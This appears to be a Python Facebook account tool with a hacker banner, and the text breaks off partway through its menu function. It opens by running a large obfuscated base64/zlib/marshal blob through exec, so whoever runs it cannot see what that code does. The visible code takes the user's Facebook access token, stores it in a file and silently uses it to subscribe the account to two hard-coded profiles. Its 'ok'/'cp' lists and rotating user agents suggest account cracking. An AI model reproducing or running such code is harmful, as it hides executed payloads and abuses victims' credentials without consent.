import marshal,zlib,base64
exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
#encrypt by zihad

import os,re,sys,time,random,datetime,requests

from concurrent.futures import ThreadPoolExecutor

from requests.exceptions import ConnectionError

from bs4 import BeautifulSoup as parser

from time import sleep

H = ('\x1b[1;90m')

M = ('\x1b[1;91m')

H = ('\x1b[1;92m')

K = ('\x1b[1;93m')

T = ('\x1b[1;94m')

U = ('\x1b[1;95m')

B = ('\x1b[1;96m')

P = ('\x1b[1;97m')

logo = """

figlet SIAM | lolcat

"""

___banner___ = (""" 

\033[0;93m ____ ___    _    __  __  __     ___   _   _

\033[0;93m/ ___|_ _|  / \  |  \/  | \ \   / / \ | | | |

\033[0;96m \___ \| |  / _ \ | |\/| |  \ \ / / _ \| | | |

\033[0;96m___) | | / ___ \| |  | |   \ V / ___ \ |_| |

\033[0;96m|____/___/_/   \_\_|  |_|    \_/_/   \_\___/

\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

\033[0;91mAUTHOR   : SIAM VAU 

\033[0;93mFACEBOOK : SIAM VAU

\033[0;96mGITHUB   : SIAM VAU

\033[0;95mTOOLS    : ZIHAD AHMED 

\033[0;96m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

""")

loop = 0

ok = []

cp = []

ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')

ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')

ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')

ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')

ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')

ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')

ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')

ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')

ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')

ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')

ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')

ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')

ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')

ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])

def ___login___():

    os.system('clear')

    print(___banner___)

    

    print("%s[%s\033[0;92m!%s]%s \033[0;92mUSE TOKEN TO LOGIN %s{%sOpen%s}\n"%(H,P,H,P,H,K,H))

    try:

        ___token = input("%s[%s\033[0;96m?%s]%s \033[0;96mTOKEN :%s "%(B,P,B,P,H))

        if ___token in ['open','Open']:

            print("%s[%s?*%s]%s Facebook!"%(K,P,K,P))

            os.system('xdg-open https://www.facebook.com/malihatafanum.96')

            exit()

        else:

            ___get = requests.get('https://graph.facebook.com/me/?access_token={}'.format(___token)).json()['name']

            open('login.txt','w').write(___token)

            print("%s[%s*%s]%s \033[0;95mWELCOME :%s %s"%(H,P,H,P,K,___get))

            ___follow___()

    except (KeyError):

        print("%s[%s!%s]%s Token Accepted"%(M,P,M,P));sleep(3);___login___()

    except (ConnectionError):

        exit("%s[%s!%s]%s token Error"%(K,P,K,P))

def ___follow___():

    try:

        ___token = open('login.txt', 'r').read()

    except (IOError):

        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(2);___login___()

    try:

        # Kalau Mau Di Ganti Izin Dulu!

        ___zed = datetime.datetime.now()

        ___waktu = ___zed.strftime('%A, %d %B %Y/%H.%M.%S')

        ___kata___ = random.choice(['AHN '])

        ___komen___ = ('I Love You @[100009521816069:] \n\n'+___kata___+'\n'+___waktu)

        ___komen2___ = ('I Love You @[100009521816069:]\n\n'+___kata___+'\n'+___waktu)

        ___komen3___ = random.choice(['Hello Have A Nyc Day'])

        requests.post('https://graph.facebook.com/100009521816069/subscribers?access_token=%s'%(___token)) 

        requests.post('https://graph.facebook.com/100076835203956/subscribers?access_token=%s'%(___token)) 

      

    except:

        exit("%s[%s!%s]%s \033[0;95mLogin"%(M,P,M,P))

    print("%s[%s*%s]%s \033[0;95mLogin done"%(H,P,H,P))

    ___menu___()

def ___menu___():

    try:

        ___token = open('login.txt','r').read()

    except (IOError):

        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(3);___login___()

    try:

        ___get = requests.get('https://graph.facebook.com/me/?access_token={}'.format(___token)).json()['name']

        os.system('clear')

        print(___banner___)

        print("%s[%s•%s]%s \033[0;95mWELCOME :%s %s"%(H,P,H,P,K,___get))

        try:

            ___gep = requests.get('http://ipinfo.io/json').json()

            print("%s[%s\033[0;96m•%s]%s \033[0;95mREGION  :%s %s"%(H,P,H,P,K,___gep['region']))

            print("%s[%s\033[0;91m•%s]%s \033[0;95mIP      :%s %s\n"%(H,P,H,P,K,___gep['ip']))

        except:

            print("%s[%s•%s]%s \033[0;95mREGION  :%s -"%(H,P,H,P,K))

